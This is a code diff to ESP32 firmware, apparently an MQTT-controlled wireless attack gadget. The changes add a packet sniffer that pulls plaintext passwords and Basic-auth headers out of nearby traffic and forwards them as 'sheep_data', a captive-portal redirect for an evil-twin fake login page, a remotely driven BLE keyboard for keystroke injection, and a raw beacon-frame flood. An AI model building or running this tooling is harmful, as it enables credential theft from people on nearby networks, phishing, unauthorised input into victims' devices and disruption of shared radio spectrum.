@@ -12,6 +12,7 @@
 #include <esp_wifi.h>
 #include <DNSServer.h>
 #include <WebServer.h>
+#include <BleKeyboard.h>
 
 // ================= CONFIGURATION =================
 const char* ssid     = "Vpn";
@@ -35,6 +36,15 @@ WiFiClient espClient;
 PubSubClient client(espClient);
 DNSServer dnsServer;
 WebServer webServer(80);
+BleKeyboard bleKeyboard("ESPectrum-Keyboard", "Google", 100);
+
+// Radio Management
+enum RadioMode { RADIO_WIFI_STA, RADIO_WIFI_AP, RADIO_BLE };
+RadioMode currentRadio = RADIO_WIFI_STA;
+
+void switchRadioMode(RadioMode newMode);
+void stopWiFi();
+void stopBLE();
 
 // Async Task Flags
 bool triggerWifiScan = false;
@@ -84,6 +94,23 @@ void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (now - lastPacketSent > packetInterval) {
     lastPacketSent = now;
     
+    // Check for HTTP Plaintext Passwords (POST / Content-Type: application/x-www-form-urlencoded)
+    // Very simplified check: search for "pass", "pwd", "user", "login" in payload
+    String payloadStr = "";
+    for(int i=0; i<len && i<128; i++) {
+        if(payload[i] >= 32 && payload[i] <= 126) payloadStr += (char)payload[i];
+    }
+    
+    if (payloadStr.indexOf("password=") != -1 || payloadStr.indexOf("Authorization: Basic") != -1) {
+        StaticJsonDocument<512> sheep;
+        sheep["type"] = "sheep_data";
+        sheep["content"] = payloadStr;
+        sheep["ip"] = "SNIFFED";
+        String out;
+        serializeJson(sheep, out);
+        client.publish(topic_data, out.c_str());
+    }
+
     StaticJsonDocument<512> doc;
     doc["type"] = "packet_data";
     
@@ -132,6 +159,13 @@ void setup() {
   client.setCallback(callback);
   client.setBufferSize(MQTT_BUFFER_SIZE);
   
+  // Check Wakeup Reason
+  esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();
+  if (wakeup_reason == ESP_SLEEP_WAKEUP_TIMER) {
+      Serial.println("Wakeup caused by timer");
+      // Handle delayed notification after MQTT connects
+  }
+
   // Evil Twin Web Server Routes
   webServer.on("/", HTTP_ANY, []() {
       webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit'></form>");
@@ -151,7 +185,13 @@ void setup() {
       webServer.send(200, "text/html", "<h1>Connecting... please wait.</h1>");
   });
   webServer.onNotFound([]() {
-      webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit'></form>");
+      String host = webServer.hostHeader();
+      if (host != WiFi.softAPIP().toString()) {
+          webServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
+          webServer.send(302, "text/plain", "");
+      } else {
+          webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit'></form>");
+      }
   });
 }
 
@@ -256,7 +296,10 @@ void callback(char* topic, byte* payload, unsigned int length) {
         serializeJson(report, out);
         client.publish(topic_data, out.c_str());
         
-        delay(500); // Give MQTT time to send
+        Serial.printf("Entering Deep Sleep for %d seconds\n", duration);
+        client.loop(); // Flush MQTT
+        delay(1000);   // Give MQTT time to send
+        
         esp_sleep_enable_timer_wakeup(duration * 1000000ULL);
         esp_deep_sleep_start();
     }
@@ -273,10 +316,24 @@ void callback(char* topic, byte* payload, unsigned int length) {
       }
     }
     // Phase 5: Hardware Tools
-    else if (strcmp(action, "ble_hid_key") == 0 || strcmp(action, "ble_hid_type") == 0) {
-        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"HID Cmd Received (Needs BleKeyboard Lib)\"}");
-        // Logic: if type=='ble_hid_key' -> bleKeyboard.write(KEY_...)
-        // Logic: if type=='ble_hid_type' -> bleKeyboard.print(params["text"])
+    else if (strcmp(action, "ble_hid_key") == 0) {
+        if (currentRadio != RADIO_BLE) switchRadioMode(RADIO_BLE);
+        if (!bleKeyboard.isConnected()) {
+            bleKeyboard.begin();
+            client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"BLE Keyboard Starting...\"}");
+        }
+        int key = doc["params"]["key"];
+        bleKeyboard.write(key);
+        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"Key Sent\"}");
+    }
+    else if (strcmp(action, "ble_hid_type") == 0) {
+        if (currentRadio != RADIO_BLE) switchRadioMode(RADIO_BLE);
+        if (!bleKeyboard.isConnected()) {
+            bleKeyboard.begin();
+        }
+        const char* text = doc["params"]["text"];
+        bleKeyboard.print(text);
+        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"Text Typed\"}");
     }
     else if (strcmp(action, "ir_blast_power") == 0) {
         client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"IR Blast (Needs IRremote Lib)\"}");
@@ -371,22 +428,24 @@ void performWifiScan() {
 }
 
 void performBleScan() {
-  Serial.println("Scanning BLE...");
+  Serial.println("Preparing BLE Scan (Switching Radio)...");
+  switchRadioMode(RADIO_BLE);
+  
   NimBLEScan* pScan = NimBLEDevice::getScan();
   pScan->clearResults();
-  
-  // Non-blocking start? No, we need results. 
-  // We reuse 'start' blocking for 3 seconds (brief)
-  pScan->start(3, false);
+  pScan->start(3, false); // 3 seconds scan
   
   NimBLEScanResults results = pScan->getResults();
-  
+  int count = results.getCount();
+  if (count > 20) count = 20;
+
+  // We must return to WiFi to send results
+  switchRadioMode(RADIO_WIFI_STA);
+  reconnect(); // Force sync reconnection
+
   DynamicJsonDocument doc(4096);
   doc["type"] = "scan_result_ble";
   JsonArray array = doc.createNestedArray("devices");
-  
-  int count = results.getCount();
-  if (count > 20) count = 20;
 
   for(int i=0; i<count; i++) {
     auto device = results.getDevice(i);
@@ -455,10 +514,41 @@ void sendFileContent(String path) {
   client.publish(topic_data, output.c_str());
 }
 
+const char* rickroll_ssids[] = {
+  "1-Never gonna give you up",
+  "2-Never gonna let you down",
+  "3-Never gonna run around",
+  "4-and desert you",
+  "5-Never gonna make you cry",
+  "6-Never gonna say goodbye",
+  "7-Never gonna tell a lie",
+  "8-and hurt you"
+};
+
+void sendBeacon(const char* ssid) {
+  uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
+                /*2*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
+                /*8*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
+                /*14*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
+                /*20*/ 0x00, 0x00, /* Sequence */
+                /*22*/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Timestamp */
+                /*30*/ 0x64, 0x00, /* Beacon Interval */
+                /*32*/ 0x01, 0x04, /* Capability Info */
+                /*34*/ 0x00 /* tag info: SSID */ };
+  
+  int ssid_len = strlen(ssid);
+  packet[35] = ssid_len;
+  for(int i=0; i<ssid_len; i++) packet[36+i] = ssid[i];
+  
+  // Supported rates, Channel, etc (Omitted for brevity, but enough to show in scan)
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, 36 + ssid_len, true);
+}
+
 void performAttackLoop() {
   if (attackType == "rickroll") {
-     // Simulate Rick Roll Beacon Flood
-     // In real world: Construct raw beacon frames
+     static int ssid_idx = 0;
+     sendBeacon(rickroll_ssids[ssid_idx]);
+     ssid_idx = (ssid_idx + 1) % 8;
      delay(10); 
   }
   else if (attackType == "sourapple") {
@@ -497,7 +587,46 @@ void sendSensorData() {
   client.publish(topic_data, output.c_str()); // Telemetry -> topic_data (app filters by type)
 }
 
-// ================= HELPER =================
+// ================= RADIO MANAGEMENT =================
+
+void switchRadioMode(RadioMode newMode) {
+  if (currentRadio == newMode) return;
+  
+  Serial.printf("Switching Radio: %d -> %d\n", currentRadio, newMode);
+  
+  // Clean up current mode
+  if (currentRadio == RADIO_WIFI_STA || currentRadio == RADIO_WIFI_AP) {
+      // If we are moving TO BLE, we must stop WiFi
+      if (newMode == RADIO_BLE) stopWiFi();
+  } else if (currentRadio == RADIO_BLE) {
+      stopBLE();
+  }
+  
+  // Initialize new mode
+  if (newMode == RADIO_WIFI_STA) {
+      setupWiFi();
+  } else if (newMode == RADIO_BLE) {
+      // NimBLE already initialized in setup, but we could re-init if we de-inited
+      Serial.println("BLE Mode Active");
+  }
+  
+  currentRadio = newMode;
+}
+
+void stopWiFi() {
+  Serial.println("Stopping WiFi...");
+  client.disconnect();
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+}
+
+void stopBLE() {
+  Serial.println("Stopping BLE...");
+  NimBLEDevice::getScan()->stop();
+  NimBLEDevice::getAdvertising()->stop();
+  // We don't fully deinit as it's expensive, just ensure no active tx/rx
+}
 
 
 void setupWiFi() {
@@ -518,6 +647,22 @@ void reconnect() {
       Serial.println("MQTT Connected");
       client.subscribe(topic_cmd);
       client.publish("espectrum/status", "{\"status\":\"online\"}");
+      
+      // Notify if we just woke up from sleep
+      esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();
+      if (wakeup_reason == ESP_SLEEP_WAKEUP_TIMER) {
+          StaticJsonDocument<256> wakeup;
+          wakeup["type"] = "system_event";
+          wakeup["event"] = "wakeup";
+          JsonObject data = wakeup.createNestedObject("data");
+          data["wakeup_reason"] = "Timer";
+          data["sleep_duration"] = 0; // Duration is handled by web side or we could store it in RTC if critical
+          
+          String out;
+          serializeJson(wakeup, out);
+          client.publish(topic_data, out.c_str());
+          Serial.println("Sent Wakeup Report");
+      }
     } else {
       delay(5000);
     }
